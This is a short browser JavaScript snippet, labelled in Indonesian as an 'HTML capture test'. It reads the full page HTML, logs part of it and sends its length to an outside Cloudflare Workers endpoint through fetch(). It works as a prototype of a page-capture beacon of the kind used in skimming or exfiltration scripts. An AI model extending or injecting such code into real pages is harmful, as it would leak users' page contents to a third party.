(async () => {
    const html = document.documentElement.outerHTML;

    console.log("Ukuran HTML:", html.length);
    console.log("Awal HTML:", html.slice(0, 200));

    const r = await fetch(
        "https://memek-worker.defoy89122.workers.dev/?message=" +
        encodeURIComponent(
            "HTML_CAPTURE_TEST ukuran=" + html.length
        )
    );

    console.log("Worker:", r.status, await r.text());
})();
